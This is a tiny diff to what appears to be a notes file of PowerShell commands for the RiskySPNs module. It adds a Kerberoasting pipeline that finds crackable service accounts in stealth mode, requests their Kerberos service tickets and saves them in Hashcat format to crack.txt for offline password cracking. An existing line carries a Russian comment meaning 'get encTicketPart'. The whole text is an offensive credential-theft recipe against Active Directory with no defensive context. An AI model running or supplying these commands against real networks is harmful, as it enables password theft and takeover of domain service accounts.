@@ -5,3 +5,4 @@ Import-Module .\RiskySPNs.psm1
 Find-PotentiallyCrackableAccounts
 Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher | Format-List * (получить encTicketPart)
 
+Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format "Hashcat"| Format-List * | Out-File  crack.txt
